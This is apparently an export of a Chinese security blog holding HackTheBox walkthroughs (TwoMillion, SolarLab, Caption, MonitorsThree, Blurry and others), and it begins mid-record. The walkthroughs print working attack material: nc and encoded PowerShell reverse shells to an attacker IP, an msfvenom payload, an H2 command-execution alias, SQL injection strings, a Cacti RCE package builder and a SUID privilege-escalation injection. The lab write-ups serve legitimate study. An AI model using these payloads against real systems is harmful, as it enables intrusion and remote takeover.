code\u0026#34;,\r\u0026#34;/api/v1/user/auth\u0026#34;: \u0026#34;Check if user is authenticated\u0026#34;,\r\u0026#34;/api/v1/user/vpn/generate\u0026#34;: \u0026#34;Generate a new VPN configuration\u0026#34;,\r\u0026#34;/api/v1/user/vpn/regenerate\u0026#34;: \u0026#34;Regenerate VPN configuration\u0026#34;,\r\u0026#34;/api/v1/user/vpn/download\u0026#34;: \u0026#34;Download OVPN file\u0026#34;\r},\r\u0026#34;POST\u0026#34;: {\r\u0026#34;/api/v1/user/register\u0026#34;: \u0026#34;Register a new user\u0026#34;,\r\u0026#34;/api/v1/user/login\u0026#34;: \u0026#34;Login with existing user\u0026#34;\r}\r},\r\u0026#34;admin\u0026#34;: {\r\u0026#34;GET\u0026#34;: {\r\u0026#34;/api/v1/admin/auth\u0026#34;: \u0026#34;Check if user is admin\u0026#34;\r},\r\u0026#34;POST\u0026#34;: {\r\u0026#34;/api/v1/admin/vpn/generate\u0026#34;: \u0026#34;Generate VPN for specific user\u0026#34;\r},\r\u0026#34;PUT\u0026#34;: {\r\u0026#34;/api/v1/admin/settings/update\u0026#34;: \u0026#34;Update user settings\u0026#34;\r}\r}\r}\r} 尝试使用/api/admin，确实存在\n访问/api/v1/admin/vpn/generate，有身份验证\n在/api/v1/admin/settings/update路径中有不同的响应头，因为不允许用GET或者POST方式，于是尝试使用了PUT\n其中返回的信息里会提示缺失的参数，补全即可，如图将我的账户设置为了admin\n现在我们再来测试admin\n尝试去获得admin的vpn\n但是呢这里并没有办法进行连接\n尝试在这里进行命令执行，发现成功\n{\r\u0026#34;username\u0026#34;:\u0026#34;hyh;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2\u0026gt;\u0026amp;1|nc 10.10.16.29 100 \u0026gt;/tmp/f;\u0026#34;\r} 拿到www-data的shell\n上传linpeas.sh，发现3306的端口是开放的，可能存在数据库服务\n并且发现了数据库的用户名和密码\nssh登录成功！获得user.txt\nPrivilege Escalation #\r我在数据库中发现了其他两个用户的密码\n不过都无法爆破成功\n在/var/mail文件夹下发现了信息\nFrom: ch4p \u0026lt;ch4p@2million.htb\u0026gt;\rTo: admin \u0026lt;admin@2million.htb\u0026gt;\rCc: g0blin \u0026lt;g0blin@2million.htb\u0026gt;\rSubject: Urgent: Patch System OS\rDate: Tue, 1 June 2023 10:45:22 -0700\rMessage-ID: \u0026lt;9876543210@2million.htb\u0026gt;\rX-Mailer: ThunderMail Pro 5.2\rHey admin,\rI\u0026#39;m know you\u0026#39;re working as fast as you can to do the DB migration. While we\u0026#39;re partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can\u0026#39;t get popped by that.\rHTB Godfather 意思是似乎这个系统存在某个Linux的内核CVE\nCVE-2023-0386 #\rGithub：xkaneiki/CVE-2023-0386: CVE-2023-0386在ubuntu22.04上的提权 (github.com)\n将其远程下载下来\n拿到root.txt！\nSummary #\r这个注册好像是HTB平台之前的一个小彩蛋，需要用户自己在网站的js里找到邀请码才能注册\n提权部分给的提示就比较直接了，可以直接在搜索引擎里找到对应的poc\n","date":"2024-09-21","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-towmillion/","section":"Posts","summary":"","title":"HTB-TowMillion","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Medium Nmap Scan #\r开放端口：80、135、139、445\n可以看到存在smb服务（SMB是一种网络文件共享协议）\n尝试使用smbclient进行连接\n需要密码，不过能看出有一些分享的资源\n使用免密连接，成功进入Documents\n使用get命令将文件下载下来\n在details-file.xlsx里面发现了敏感信息\nSubdomain Fuzzing #\r发现report子域名\n不过直接进入该子域名会重定向到solarlab.htb，于是再进行一次全端口扫描，应该是还有遗漏的端口\n进入6791端口，是一个登录界面\n之前下载了一个xlsx表格里面有用户名和密码，进行逐一尝试\nAlexanderK和ClaudiaS都是用户认证失败，其余的都是用户不存在，可以注意到的是blake的密码似乎比较特别，但是用户名格式与另外的不对，猜测真正的用户名应该是：blakeB\n登录成功\nCVE-2023-33733 #\rGithub：L41KAA/CVE-2023-33733-Exploit-PoC (github.com)\n准备好powershell的反弹shell\n┌──(root㉿kali)-[/home/kali/Desktop/Solarlab/CVE-2023-33733-Exploit-PoC]\r└─# python exp.py --host \u0026#34;report.solarlab.htb\u0026#34; --port 6791 --cmd \u0026#34;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgA5ACIALAAxADAAMAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=\u0026#34; --username \u0026#34;blakeB\u0026#34; --password \u0026#34;ThisCanB3typedeasily1@\u0026#34; 成功反弹到shell，并且在blake的桌面拿到user.txt\nPrivilege Escalation #\r这里给靶机上一个msf木马\n┌──(root㉿kali)-[/home/kali/Desktop/Solarlab]\r└─# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.29 lport=6789 -f exe -o shell.exe ┌──(root㉿kali)-[/home/kali/Desktop/Solarlab]\r└─# python -m http.server 80\rServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\r10.10.11.16 - - [19/Sep/2024 07:41:48] \u0026#34;GET /shell.exe HTTP/1.1\u0026#34; 200 - 在目录遍历中，我发现了一个Openfire文件夹位于Program Files中\n#查看端口情况\rnetstat -an | findstr LISTEN 发现了很多openfire相关的服务正在运行中\n并且经过信息收集发现openfire是存在RCE漏洞的\nGithub：K3ysTr0K3R/CVE-2023-32315-EXPLOIT: A PoC exploit for CVE-2023-32315 - Openfire Authentication Bypass (github.com)\n并且也可以curl查看到存在登录界面\n由于meterpreter自带的有端口转发工具（portfwd），我尝试了一下，无法使用，why？？？？\n或许是因为windows防火墙的原因导致端口转发失败\n可以使用chisel来进行端口转发：Release v1.7.4 · jpillora/chisel (github.com)\n#windows\rC:\\tmp\u0026gt;chisel_win.exe client 10.10.16.29:1234 R:9090:127.0.0.1:9090\r#kali\r┌──(root㉿kali)-[/home/kali/Desktop/Solarlab]\r└─# ./chisel_1.7.4_linux_amd64 server --socks5 --reverse -p 1234 代理成功\nCVE-2023-32315 #\r得到用户名和密码\n在openfire界面中可以上传插件\nGithub：miko550/CVE-2023-32315: Openfire Console Authentication Bypass Vulnerability with RCE plugin (github.com)\n将编译好的jar包进行上传，进入server settings-\u0026gt;manage tools，默认的密码是：123\n由于靶机目录中没有**nc.exe**，需要远程下载一下\ncurl 10.10.16.29/nc.exe -O nc.exe nc.exe 10.10.16.29 100 -e powershell.exe 成功进入Openfire目录！\n但是无法进入Administrator，在日志文件中发现admin的账户\n在openfire.script中，发现了类似于密码哈希的东西\nCREATE MEMORY TABLE PUBLIC.OFUSER(USERNAME VARCHAR(64) NOT NULL,STOREDKEY VARCHAR(32),SERVERKEY VARCHAR(32),SALT VARCHAR(32),ITERATIONS INTEGER,PLAINPASSWORD VARCHAR(32),ENCRYPTEDPASSWORD VARCHAR(255),NAME VARCHAR(100),EMAIL VARCHAR(100),CREATIONDATE VARCHAR(15) NOT NULL,MODIFICATIONDATE VARCHAR(15) NOT NULL,CONSTRAINT OFUSER_PK PRIMARY KEY(USERNAME)) INSERT INTO OFUSER VALUES(\u0026#39;admin\u0026#39;,\u0026#39;gjMoswpK+HakPdvLIvp6eLKlYh0=\u0026#39;,\u0026#39;9MwNQcJ9bF4YeyZDdns5gvXp620=\u0026#39;,\u0026#39;yidQk5Skw11QJWTBAloAb28lYHftqa0x\u0026#39;,4096,NULL,\u0026#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442\u0026#39;,\u0026#39;Administrator\u0026#39;,\u0026#39;admin@solarlab.htb\u0026#39;,\u0026#39;001700223740785\u0026#39;,\u0026#39;0\u0026#39;) 两者相对比\nsalt：yidQk5Skw11QJWTBAloAb28lYHftqa0x\rencryptpass：becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 并且我找到了一个能够进行解密的工具\nGithub：jas502n/OpenFire_Decrypt: OpenFire (github.com)\n得到了Administrator的密码！\n使用impack-smbexec远程执行\n拿到root.txt!\nSummary #\r在meterpreter的protfwd端口转发那里，还是不太理解为什么不能转发成功，反而要借助其他的EXE文件来进行建立隧道。\n关于smbexec的文章：SMBExec：红面分析（第 2 部分） (stacktitan.com)\n为什么不能在smbexec中执行CD操作？此文章中提到了：smbexec并不是一个真正的交互式SHELL，运行的每个命令都会导致 Windows 服务和命令 shell 的重新执行，以及新的批处理文件和输出文件\n后面的文章中可能会对Impacket的相关脚本进行详细解析。\n","date":"2024-09-20","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-solarlab/","section":"Posts","summary":"","title":"HTB-Solarlab","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Hard Nmap Scan #\r开放端口：22、80、8080\ncaption.htb:80👇是一个登陆界面\ncaption.htb:8080👇注意到是一个Gitbucket的服务\n其中GitBucket可以使用弱密码登入：root-root\n并且发现两个仓库：Logservice，Portal\n在Caption-Portal仓库的提交历史中，发现了泄露的用户margo，以及密码\n登录80端口，但并没有什么有价值的东西，Logs路由甚至是403Forbidden\nSQL RCE #\r在Gitbucket的管理界面发现了可以执行SQL语句的部分\n并且暴露出了是H2数据库\nGoogle搜索结果：Chaining Vulnerabilities in H2 Database for RCE | by Nairuz Abulhul | R3d Buck3T | Medium\nCREATE ALIAS REVEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {\rjava.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;);\rreturn s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$; 执行这段命令给exec起个别名，然后就能调用\n在margo的文件夹下发现了ssh私钥文件\n将其写入本地kali，注意格式化以及权限设置为600\n得到user.txt\nPrivilege Escalation #\r回到Gitbucket页面的另一个Logservice仓库，可以发现是用Go语言写的\n并且还引入了thrift\n并且是运行在9090端口上\n将LogService进行git clone到margo目录下\n#靶机执行开启服务\rthrift --gen py log_service.thrift\r#nc传输文件\rmargo@caption:~/Logservice$ nc -q 0 10.10.16.29 4321 \u0026lt; log_service.thrift\r┌──(root㉿kali)-[/home/kali/Desktop/Caption]\r└─# nc -lnvp 4321 \u0026gt; log_service.thrift\r#kali安装库\r┌──(root㉿kali)-[/home/kali/Desktop/Caption]\r└─# pip3 install thrift 将靶机端口转发到kali上\n┌──(root㉿kali)-[/home/kali/Desktop/Caption]\r└─# ssh -i margo.key -L 9090:127.0.0.1:9090 margo@10.10.11.33 写入恶意日志文件\nmargo@caption:~/Logservice$ cat /tmp/evil.log 127.0.0.1 \u0026#34;user-agent\u0026#34;:\u0026#34;\u0026#39;; /bin/bash /tmp/hyh.sh #\u0026#34;\rmargo@caption:~/Logservice$ cat /tmp/hyh.sh chmod +s /bin/bash 回到kali\n┌──(root㉿kali)-[/home/kali/Desktop/Caption]\r└─# thrift -r --gen py log_service.thrift 写入py文件\n┌──(root㉿kali)-[/home/kali/Desktop/Caption/gen-py]\r└─# cat client.py from thrift.transport import TSocket\rfrom thrift.transport import TTransport\rfrom thrift.protocol import TBinaryProtocol\rfrom log_service import LogService\rdef main():\rtransport = TSocket.TSocket(\u0026#39;127.0.0.1\u0026#39;, 9090)\rtransport = TTransport.TBufferedTransport(transport)\rprotocol = TBinaryProtocol.TBinaryProtocol(transport)\rclient = LogService.Client(protocol)\rtransport.open()\rtry:\rresponse = client.ReadLogFile(\u0026#34;/tmp/evil.log\u0026#34;)\rexcept Exception as e:\rprint(f\u0026#34;Error: {e}\u0026#34;)\rfinally:\rtransport.close()\rif __name__ == \u0026#34;__main__\u0026#34;:\rmain() 保存好后最后执行client.py\n┌──(root㉿kali)-[/home/kali/Desktop/Caption/gen-py]\r└─# python client.py 得到root.txt\nSummary #\r个人感觉还是有点抽象\n提权部分主要的思路是写入恶意的日志文件，然后通过thrift的连接让客户端主动执行bash的权限提升\n不过我搜索了一下好像并没有thrift的相关提权操作，这应该是thrift的特性？不知道是否是thrift的操作都具有最高权限。\n相关的writeup\nHacktheBox-Caption | 心流 (natro92.fun)\nHackTheBox: Caption | Str4ngerX (loghmariala.github.io)\n","date":"2024-09-18","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-caption/","section":"Posts","summary":"","title":"HTB-Caption","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Basic Scan #\rNmap #\rDirsearch #\r找到一些敏感文件\n进入login.php，发现pluck的版本是4.7.18\nCVE-2023-50564 #\r查询相关漏洞之后，发现RCE需要先上传文件。\n进入3000端口\n找到pass.php，并尝试解密\n登录成功，进入installmodule\n这里把反弹shell文件进行压缩后上传\nphp-reverse-shell/php-reverse-shell.php at master · pentestmonkey/php-reverse-shell (github.com)\n得到反弹shell\n存在两个用户，git和junior，其中junior能进去，但是没有权限读取user.txt\npython3 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; 升级shell，用之前的密码尝试切换junior用户，得到user.txt\nPrivilege Escalation #\r尝试下载这个pdf文件\n使用nc连接传输\n#靶机\rjunior@greenhorn:~$ nc -q 0 10.10.16.29 4321 \u0026lt; \u0026#39;Using OpenVAS.pdf\u0026#39;\r#kali\rnc -lnvp 4321 \u0026gt; file.pdf 打开这个pdf，发现密码被打了码\nGithub工具：spipm/Depix: Recovers passwords from pixelized screenshots (github.com)\npython3 depix.py -p /home/kali/Pictures/ma.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o output.png 勉强能看出是：sidefromsidetheothersidesidefromsidetheotherside\nSummary #\r做到这个题目才知道有Depix这种消除马赛克的东西，感觉很厉害\n整体来说比较常规\n","date":"2024-09-17","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-greenhorn/","section":"Posts","summary":"","title":"HTB-Greenhorn","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Basic Scan #\rNmap #\rnmap -A -O monitorsthree.htb 开放端口：22、80、8084\nWeb server：nginx 1.18.0\nDirsearch #\rdirsearch -u monitorsthree.htb -t 50 发现：login.php\nSubdomain Fuzzing #\rffuf -w main.txt -u http://monitorsthree.htb -H \u0026#34;Host:FUZZ.monitorsthree.htb\u0026#34; -ac 发现子域名，以及版本信息\n经过搜寻之后并没有可以直接不登陆的poc\nSQL Injection #\r在找回密码页面发现admin和admin' and 1=1#的结果都是通过，而其他的不存在的用户名则报错\n这里猜测是有sql注入漏洞，将抓的包写入一个文件\nsqlmap -r monitors.req -dbms=mysql --dump 可以看出确实是存在SQL注入漏洞，这里测出是时间盲注\n由于Sqlmap实在跑的是太慢了，因为有报错信息，顺手就测了一下，发现能直接报错注入\nadmin\u0026#39; and extractvalue(1,concat(\u0026#39;~\u0026#39;,database()))# admin\u0026#39; and extractvalue(1,concat(\u0026#39;~\u0026#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database())))# 报错信息长度有限，这里使用substirng来截取\nadmin\u0026#39; AND extractvalue(1,concat(\u0026#39;~\u0026#39;,(SELECT SUBSTRING(GROUP_CONCAT(table_name),40,30) FROM information_schema.tables WHERE table_schema=database())))# 发现一个users表\nadmin\u0026#39; AND extractvalue(1,concat(\u0026#39;~\u0026#39;,(SELECT SUBSTRING(GROUP_CONCAT(column_name),1,30) FROM information_schema.columns WHERE table_name=\u0026#39;users\u0026#39;)))# 然后获取username和password\nadmin\u0026#39; AND extractvalue(1,concat(\u0026#39;~\u0026#39;,(SELECT SUBSTRING(GROUP_CONCAT(username,\u0026#39;:\u0026#39;,password),1,30) FROM users)))# admin：31a181c8372e3afc59dab863430610e8\nhashcat \u0026#39;31a181c8372e3afc59dab863430610e8\u0026#39; -m 0 /usr/share/wordlists/rockyou.txt 然后即可登录cacti子域名\nCVE-2024-25641 #\r如果是能够进入cacti的情况下，是有CVE可以利用的\nGithub：RCE vulnerability when importing packages · Advisory · Cacti/cacti (github.com)\n\u0026lt;?php\r$xmldata = \u0026#34;\u0026lt;xml\u0026gt;\r\u0026lt;files\u0026gt;\r\u0026lt;file\u0026gt;\r\u0026lt;name\u0026gt;resource/test.php\u0026lt;/name\u0026gt;\r\u0026lt;data\u0026gt;%s\u0026lt;/data\u0026gt;\r\u0026lt;filesignature\u0026gt;%s\u0026lt;/filesignature\u0026gt;\r\u0026lt;/file\u0026gt;\r\u0026lt;/files\u0026gt;\r\u0026lt;publickey\u0026gt;%s\u0026lt;/publickey\u0026gt;\r\u0026lt;signature\u0026gt;\u0026lt;/signature\u0026gt;\r\u0026lt;/xml\u0026gt;\u0026#34;;\r$filedata = \u0026#34;\u0026lt;?php phpinfo(); ?\u0026gt;\u0026#34;;\r$keypair = openssl_pkey_new(); $public_key = openssl_pkey_get_details($keypair)[\u0026#34;key\u0026#34;]; openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);\r$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));\ropenssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);\rfile_put_contents(\u0026#34;test.xml\u0026#34;, str_replace(\u0026#34;\u0026lt;signature\u0026gt;\u0026lt;/signature\u0026gt;\u0026#34;, \u0026#34;\u0026lt;signature\u0026gt;\u0026#34;.base64_encode($signature).\u0026#34;\u0026lt;/signature\u0026gt;\u0026#34;, $data));\rsystem(\u0026#34;cat test.xml | gzip -9 \u0026gt; test.xml.gz; rm test.xml\u0026#34;);\r?\u0026gt; 运行这段代码，会生成一个gz文件，在cacti里上传\n可以看到写入成功\n接下来准备反弹shell，只需要修改一下php代码里的参数即可\n在include 下的config.php 中发现数据库的用户名和密码\n并且靶机只允许密钥登录\nmysql登录拿到marcus的密码哈希\n使用hashcat爆破\nhashcat hash.txt -m 3200 /usr/share/wordlists/rockyou.txt 由于不能用密码登录，就直接在反弹shell里切换用户\nPrivilege Escalation #\r将私钥文件保存到kali\n权限改为600，即可ssh登录\n查看内部端口情况\n添加端口映射\nssh -L 8200:127.0.0.1:8200 marcus@monitorsthree.htb -i marcus.rsa 搜索一下这个duplicate\nGithub：使用 DB Server-Passphrase 绕过重复登录身份验证 ·问题 #5197 ·duplicati/duplicati (github.com)\n将文件夹中的sqlite文件下载\n发现类似于密码的东西，还有盐值\n根据此步骤重现\nvar saltedpwd = \u0026#39;59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a\u0026#39;; var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(\u0026#39;wDgyoYHEiXayJpfp3jE09CiTfnhlZKl//JzmoLhb8bw=\u0026#39;) + saltedpwd)).toString(CryptoJS.enc.Base64); console.log(noncedpwd); 成功进入后台\n并且这里可以上传一些文件，并且执行一些任务\n将backup目标选择为/marcus目录，source data选择为root下的txt文件\n点击Run now ，然后进入restore\n即可获取到root.txt\nSummary #\r最后提权的部分，理论上来说能把marcus的公钥添加到/root/.ssh中的authorized_keys，从而实现外部使用marcus的私钥登录为root用户。（不过这里能直接获取到root的flag）\n目前我做过的HTB里面，SQL注入好像还很少，本题中可以用sqlmap，也可以手动尝试，因为sqlmap不一定准确。\n","date":"2024-09-12","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-monitorsthree/","section":"Posts","summary":"","title":"HTB-MonitorsThree","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Basic Scan #\rNmap #\rnmap -A -O blurry.htb 开放端口：22、80\nWeb Server：nginx 1.18.0\nDirsearch #\rSubdomain Fuzzing #\r子域名：app、files、chat\napp.blurry.htb👇\nchat.blurry.htb👇\nfiles.blurry.htb👇\nCVE-2024-24590 #\rGithub：xffsec/CVE-2024-24590-ClearML-RCE-Exploit (github.com)\n首先要在本地初始化Clearml\n照着顺序，记得在/etc/hosts下添加api子域名\n复制凭证\nproject里面有一个Black Swan来作为目标\nnc监听获得shell\nPrivilege Escalation #\r发现具有特殊权限的文件\n可以使用evaluate_model去执行models下的pth后缀文件\n这个思路非常牛b：Blurry HTB Writeup (taipanbyte.ru)\n因为在evaluate_model里调用了/models/evaluate_model.py\ncat /usr/bin/evaluate_model\r#!/bin/bash\r# Evaluate a given model against our proprietary dataset.\r# Security checks against model file included.\rif [ \u0026#34;$#\u0026#34; -ne 1 ]; then\r/usr/bin/echo \u0026#34;Usage: $0 \u0026lt;path_to_model.pth\u0026gt;\u0026#34;\rexit 1\rfi\rMODEL_FILE=\u0026#34;$1\u0026#34;\rTEMP_DIR=\u0026#34;/opt/temp\u0026#34;\rPYTHON_SCRIPT=\u0026#34;/models/evaluate_model.py\u0026#34; /usr/bin/mkdir -p \u0026#34;$TEMP_DIR\u0026#34;\rfile_type=$(/usr/bin/file --brief \u0026#34;$MODEL_FILE\u0026#34;)\r# Extract based on file type\rif [[ \u0026#34;$file_type\u0026#34; == *\u0026#34;POSIX tar archive\u0026#34;* ]]; then\r# POSIX tar archive (older PyTorch format)\r/usr/bin/tar -xf \u0026#34;$MODEL_FILE\u0026#34; -C \u0026#34;$TEMP_DIR\u0026#34;\relif [[ \u0026#34;$file_type\u0026#34; == *\u0026#34;Zip archive data\u0026#34;* ]]; then\r# Zip archive (newer PyTorch format)\r/usr/bin/unzip -q \u0026#34;$MODEL_FILE\u0026#34; -d \u0026#34;$TEMP_DIR\u0026#34;\relse\r/usr/bin/echo \u0026#34;[!] Unknown or unsupported file format for $MODEL_FILE\u0026#34;\rexit 2\rfi\r/usr/bin/find \u0026#34;$TEMP_DIR\u0026#34; -type f \\( -name \u0026#34;*.pkl\u0026#34; -o -name \u0026#34;pickle\u0026#34; \\) -print0 | while IFS= read -r -d $\u0026#39;\\0\u0026#39; extracted_pkl; do\rfickling_output=$(/usr/local/bin/fickling -s --json-output /dev/fd/1 \u0026#34;$extracted_pkl\u0026#34;)\rif /usr/bin/echo \u0026#34;$fickling_output\u0026#34; | /usr/bin/jq -e \u0026#39;select(.severity == \u0026#34;OVERTLY_MALICIOUS\u0026#34;)\u0026#39; \u0026gt;/dev/null; then\r/usr/bin/echo \u0026#34;[!] Model $MODEL_FILE contains OVERTLY_MALICIOUS components and will be deleted.\u0026#34;\r/bin/rm \u0026#34;$MODEL_FILE\u0026#34;\rbreak\rfi\rdone\r/usr/bin/find \u0026#34;$TEMP_DIR\u0026#34; -type f -exec /bin/rm {} +\r/bin/rm -rf \u0026#34;$TEMP_DIR\u0026#34;\rif [ -f \u0026#34;$MODEL_FILE\u0026#34; ]; then\r/usr/bin/echo \u0026#34;[+] Model $MODEL_FILE is considered safe. Processing...\u0026#34;\r/usr/bin/python3 \u0026#34;$PYTHON_SCRIPT\u0026#34; \u0026#34;$MODEL_FILE\u0026#34;\rfi 而在/models/evaluate_model.py的代码是这样的\ncat /models/e*\rimport torch\rimport torch.nn as nn\rfrom torchvision import transforms\rfrom torchvision.datasets import CIFAR10\rfrom torch.utils.data import DataLoader, Subset\rimport numpy as np\rimport sys\rclass CustomCNN(nn.Module):\rdef __init__(self):\rsuper(CustomCNN, self).__init__()\rself.conv1 = nn.Conv2d(in_channels=3, out_channels=16, kernel_size=3, padding=1)\rself.conv2 = nn.Conv2d(in_channels=16, out_channels=32, kernel_size=3, padding=1)\rself.pool = nn.MaxPool2d(kernel_size=2, stride=2, padding=0)\rself.fc1 = nn.Linear(in_features=32 * 8 * 8, out_features=128)\rself.fc2 = nn.Linear(in_features=128, out_features=10)\rself.relu = nn.ReLU()\rdef forward(self, x):\rx = self.pool(self.relu(self.conv1(x)))\rx = self.pool(self.relu(self.conv2(x)))\rx = x.view(-1, 32 * 8 * 8)\rx = self.relu(self.fc1(x))\rx = self.fc2(x)\rreturn x\rdef load_model(model_path):\rmodel = CustomCNN()\rstate_dict = torch.load(model_path)\rmodel.load_state_dict(state_dict)\rmodel.eval() return model\rdef prepare_dataloader(batch_size=32):\rtransform = transforms.Compose([\rtransforms.RandomHorizontalFlip(),\rtransforms.RandomCrop(32, padding=4),\rtransforms.ToTensor(),\rtransforms.Normalize(mean=[0.4914, 0.4822, 0.4465], std=[0.2023, 0.1994, 0.2010]),\r])\rdataset = CIFAR10(root=\u0026#39;/root/datasets/\u0026#39;, train=False, download=False, transform=transform)\rsubset = Subset(dataset, indices=np.random.choice(len(dataset), 64, replace=False))\rdataloader = DataLoader(subset, batch_size=batch_size, shuffle=False)\rreturn dataloader\rdef evaluate_model(model, dataloader):\rcorrect = 0\rtotal = 0\rwith torch.no_grad(): for images, labels in dataloader:\routputs = model(images)\r_, predicted = torch.max(outputs.data, 1)\rtotal += labels.size(0)\rcorrect += (predicted == labels).sum().item()\raccuracy = 100 * correct / total\rprint(f\u0026#39;[+] Accuracy of the model on the test dataset: {accuracy:.2f}%\u0026#39;)\rdef main(model_path):\rmodel = load_model(model_path)\rprint(\u0026#34;[+] Loaded Model.\u0026#34;)\rdataloader = prepare_dataloader()\rprint(\u0026#34;[+] Dataloader ready. Evaluating model...\u0026#34;)\revaluate_model(model, dataloader)\rif __name__ == \u0026#34;__main__\u0026#34;:\rif len(sys.argv) \u0026lt; 2:\rprint(\u0026#34;Usage: python script.py \u0026lt;path_to_model.pth\u0026gt;\u0026#34;)\relse:\rmodel_path = sys.argv[1] # Path to the .pth file\rmain(model_path) 可以看到evaluate_model.py中导入了几个包\n默认情况下，Python 在导入模块时会先检查当前工作目录或脚本所在目录下是否有同名文件或模块\n如果 torch.py 存在并且在导入时优先被加载，就会执行其中的代码。由于你在 torch.py 中直接调用了 os.system(\u0026quot;bash\u0026quot;)，导致直接启动了一个 Bash Shell\nSummary #\r虽然网上有其他的wp，但是这个提升权限的思路应该是最简单的\n利用文件覆盖导入执行，应该算是python语言的特性问题\n说实话，这种思路真的一般想不到\n","date":"2024-09-11","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-blurry/","section":"Posts","summary":"","title":"HTB-Blurry","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Basic Scan #\rNmap #\rnmap -A -O sightless.htb 开放端口：21、22、80\nWeb服务器：nginx 1.18.0\nFTP服务器：ProFTPD\nDirsearch #\rdirsearch -u sightless.htb -t 50 Gobuster #\rgobuster dir -u http://sightless.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 CVE-2022-0944 #\r在网页中发现一个sqlpad子域名，似乎可以进行sql操作，但是靶机的3306端口是关闭的\n在右上角点击发现SQLpad的相关信息：6.10.0\nGithub：worm-403/scripts (github.com)\n只需要指定攻击机的IP和端口即可\n在root用户下并没有找到东西\n在/etc/shadow，中发现michael的密码hash\n使用hashcat爆破\n登录michael的账号获得user.txt\n现在的问题是，反弹获得的shell虽然是root权限，但是一部分指令是无法执行的\nPrivilege Escalation #\r上传linpeas，发现bash似乎可以用来提权\n相关文章：Linux提权————利用SUID提权_bash提权-CSDN博客\n这些命令都有root权限\n使用bash开启新的shell进程，即可看到权限是root\n获取到root.txt\nSummary #\r总体来说比较简单\n涉及到一点Linux提权\n","date":"2024-09-10","externalUrl":null,"permalink":"/posts/2024/09/hackthebox-sightless/","section":"Posts","summary":"","title":"HTB-Sightless","type":"posts"},{"content":"\rBox Info #\rOS Windows Difficulty Easy Basic Scan #\rNmap #\rnmap -A -O -Pn mailing.htb 开放端口：25、80、110、135、139、143、445、465、587、993\nServer：hMailServer\nDirsearch #\rdirsearch -u mailing.htb -t 50 